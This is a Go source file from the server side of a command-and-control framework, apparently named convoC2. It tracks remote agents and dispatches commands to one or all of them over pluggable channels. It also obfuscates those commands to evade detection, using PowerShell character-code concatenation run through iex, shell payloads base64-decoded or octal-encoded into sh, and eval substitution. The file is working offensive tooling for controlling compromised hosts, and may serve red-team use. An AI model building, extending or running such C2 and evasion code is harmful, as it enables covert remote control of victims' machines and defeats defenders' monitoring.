package server

import (
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"

	"github.com/cxnturi0n/convoC2/pkg/channels"
	"github.com/cxnturi0n/convoC2/pkg/crypto"
)

// ObfuscationType defines the type of command obfuscation
type ObfuscationType string

const (
	// NoObfuscation sends commands as-is
	NoObfuscation ObfuscationType = "none"

	// Base64Obfuscation encodes commands in base64
	Base64Obfuscation ObfuscationType = "base64"

	// PowerShellObfuscation wraps the command in PowerShell obfuscation techniques
	PowerShellObfuscation ObfuscationType = "powershell"

	// ShellObfuscation wraps the command in shell obfuscation techniques
	ShellObfuscation ObfuscationType = "shell"

	// CustomRegexObfuscation uses custom regex patterns for extraction
	CustomRegexObfuscation ObfuscationType = "custom"
)

// Commander handles command distribution to agents
type Commander struct {
	channelRegistry *channels.ChannelRegistry
	agents          map[string]*Agent
	obfuscationType ObfuscationType
	customRegex     string
	agentMutex      sync.RWMutex
}

// NewCommander creates a new commander
func NewCommander(channelRegistry *channels.ChannelRegistry) *Commander {
	return &Commander{
		channelRegistry: channelRegistry,
		agents:          make(map[string]*Agent),
		obfuscationType: NoObfuscation,
		customRegex:     `<span[^>]*aria-label="([^"]*)"[^>]*></span>`,
	}
}

// RegisterAgent adds an agent to the commander
func (c *Commander) RegisterAgent(agent *Agent) {
	c.agentMutex.Lock()
	defer c.agentMutex.Unlock()

	c.agents[agent.AgentId] = agent
}

// GetAgents returns all registered agents
func (c *Commander) GetAgents() []*Agent {
	c.agentMutex.RLock()
	defer c.agentMutex.RUnlock()

	agents := make([]*Agent, 0, len(c.agents))
	for _, agent := range c.agents {
		agents = append(agents, agent)
	}

	return agents
}

// GetActiveAgents returns all active agents
func (c *Commander) GetActiveAgents() []*Agent {
	c.agentMutex.RLock()
	defer c.agentMutex.RUnlock()

	agents := make([]*Agent, 0)
	for _, agent := range c.agents {
		if getAgentStatus(agent.AgentId) == "active" {
			agents = append(agents, agent)
		}
	}

	return agents
}

// GetAgent returns an agent by ID
func (c *Commander) GetAgent(agentID string) (*Agent, error) {
	c.agentMutex.RLock()
	defer c.agentMutex.RUnlock()

	agent, exists := c.agents[agentID]
	if !exists {
		return nil, fmt.Errorf("agent %s not found", agentID)
	}

	return agent, nil
}

// SetObfuscationType changes the command obfuscation type
func (c *Commander) SetObfuscationType(obfuscationType ObfuscationType) {
	c.obfuscationType = obfuscationType
}

// SetCustomRegex sets a custom regex pattern for command extraction
func (c *Commander) SetCustomRegex(regex string) {
	c.customRegex = regex
}

// GetObfuscationInfo returns the current obfuscation settings
func (c *Commander) GetObfuscationInfo() (ObfuscationType, string) {
	return c.obfuscationType, c.customRegex
}

// ExecuteCommand executes a command on a single agent
func (c *Commander) ExecuteCommand(agentID, command string) (string, error) {
	// Get agent
	agent, err := c.GetAgent(agentID)
	if err != nil {
		return "", err
	}

	// Check agent status
	if getAgentStatus(agent.AgentId) != "active" {
		return "", fmt.Errorf("agent %s is not active", agentID)
	}

	// Apply obfuscation
	obfuscatedCommand, err := c.obfuscateCommand(command)
	if err != nil {
		return "", fmt.Errorf("failed to obfuscate command: %w", err)
	}

	// Get available channels
	availableChannels := c.channelRegistry.GetAvailableChannels()
	if len(availableChannels) == 0 {
		return "", fmt.Errorf("no communication channels available")
	}

	// Try each channel until one succeeds
	var lastError error
	for _, channel := range availableChannels {
		err := channel.SendCommand(agent.AgentId, obfuscatedCommand)
		if err == nil {
			// Command sent successfully
			agent.CommandHistory = append(agent.CommandHistory, command)
			agent.CommandHistoryCmd = append(agent.CommandHistoryCmd, obfuscatedCommand)
			return fmt.Sprintf("Command sent to agent %s via %s channel", agent.AgentId, channel.Name()), nil
		}
		lastError = err
	}

	return "", fmt.Errorf("all channels failed: %w", lastError)
}

// ExecuteCommandOnAll executes a command on all active agents
func (c *Commander) ExecuteCommandOnAll(command string) (string, error) {
	// Get active agents
	activeAgents := c.GetActiveAgents()
	if len(activeAgents) == 0 {
		return "", fmt.Errorf("no active agents found")
	}

	// Apply obfuscation
	obfuscatedCommand, err := c.obfuscateCommand(command)
	if err != nil {
		return "", fmt.Errorf("failed to obfuscate command: %w", err)
	}

	// Get available channels
	availableChannels := c.channelRegistry.GetAvailableChannels()
	if len(availableChannels) == 0 {
		return "", fmt.Errorf("no communication channels available")
	}

	// Send command to all agents
	var wg sync.WaitGroup
	results := make(map[string]string)
	resultsMutex := sync.Mutex{}

	for _, agent := range activeAgents {
		wg.Add(1)
		go func(a *Agent) {
			defer wg.Done()

			// Try each channel until one succeeds
			for _, channel := range availableChannels {
				err := channel.SendCommand(a.AgentId, obfuscatedCommand)
				if err == nil {
					// Command sent successfully
					resultsMutex.Lock()
					results[a.AgentId] = fmt.Sprintf("Command sent via %s", channel.Name())
					resultsMutex.Unlock()

					// Update agent history
					c.agentMutex.Lock()
					a.CommandHistory = append(a.CommandHistory, command)
					a.CommandHistoryCmd = append(a.CommandHistoryCmd, obfuscatedCommand)
					c.agentMutex.Unlock()

					return
				}
			}

			// All channels failed
			resultsMutex.Lock()
			results[a.AgentId] = "Failed to send command"
			resultsMutex.Unlock()
		}(agent)
	}

	// Wait for all goroutines to finish
	wg.Wait()

	// Generate result summary
	var resultBuilder strings.Builder
	resultBuilder.WriteString(fmt.Sprintf("Command sent to %d/%d agents:\n", len(results), len(activeAgents)))

	for agentID, result := range results {
		resultBuilder.WriteString(fmt.Sprintf("- Agent %s: %s\n", agentID, result))
	}

	return resultBuilder.String(), nil
}

// obfuscateCommand applies the configured obfuscation to a command
func (c *Commander) obfuscateCommand(command string) (string, error) {
	switch c.obfuscationType {
	case NoObfuscation:
		return command, nil

	case Base64Obfuscation:
		// Base64 encoding is handled by encryption in the server execution
		return command, nil

	case PowerShellObfuscation:
		return c.obfuscatePowerShell(command)

	case ShellObfuscation:
		return c.obfuscateShell(command)

	case CustomRegexObfuscation:
		// Custom regex is handled by the agent
		return command, nil

	default:
		return command, nil
	}
}

// obfuscatePowerShell applies PowerShell-specific obfuscation techniques
func (c *Commander) obfuscatePowerShell(command string) (string, error) {
	// Example PowerShell obfuscation techniques:
	// 1. Character substitution
	// 2. String concatenation
	// 3. Variable substitution

	// Add random variable names
	varName := randomVariableName()

	// Apply character substitution and concatenation
	var obfuscatedParts []string
	for _, char := range command {
		if rand.Intn(2) == 0 {
			// Use direct character
			obfuscatedParts = append(obfuscatedParts, string(char))
		} else {
			// Use character code
			obfuscatedParts = append(obfuscatedParts, fmt.Sprintf("[char]%d", int(char)))
		}
	}

	// Join with random mix of + or string concatenation
	var joinedParts []string
	for i := 0; i < len(obfuscatedParts); i += 3 {
		end := i + 3
		if end > len(obfuscatedParts) {
			end = len(obfuscatedParts)
		}

		section := strings.Join(obfuscatedParts[i:end], "+")
		joinedParts = append(joinedParts, section)
	}

	obfuscated := fmt.Sprintf("$%s=(%s);iex $%s", varName, strings.Join(joinedParts, "+"), varName)
	return obfuscated, nil
}

// obfuscateShell applies shell-specific obfuscation techniques
func (c *Commander) obfuscateShell(command string) (string, error) {
	// Example shell obfuscation techniques:
	// 1. Environment variable expansion
	// 2. Command substitution
	// 3. Backtick escaping

	// Apply random substitutions
	techniques := []func(string) string{
		func(cmd string) string {
			// Base64 encode
			return fmt.Sprintf("echo '%s' | base64 -d | sh", crypto.Base64EncodeString(cmd))
		},
		func(cmd string) string {
			// Character by character execution using printf
			var parts []string
			for _, char := range cmd {
				parts = append(parts, fmt.Sprintf("\\%03o", char))
			}
			return fmt.Sprintf("printf '%s' | sh", strings.Join(parts, ""))
		},
		func(cmd string) string {
			// Variable substitution
			varName := randomVariableName()
			return fmt.Sprintf("%s='%s'; eval $%s", varName, cmd, varName)
		},
	}

	// Choose a random technique
	technique := techniques[rand.Intn(len(techniques))]
	return technique(command), nil
}

// randomVariableName generates a random variable name for obfuscation
func randomVariableName() string {
	rand.Seed(time.Now().UnixNano())

	// Generate a random variable name
	length := 5 + rand.Intn(10)
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

	var result strings.Builder
	for i := 0; i < length; i++ {
		result.WriteByte(chars[rand.Intn(len(chars))])
	}

	return result.String()
}
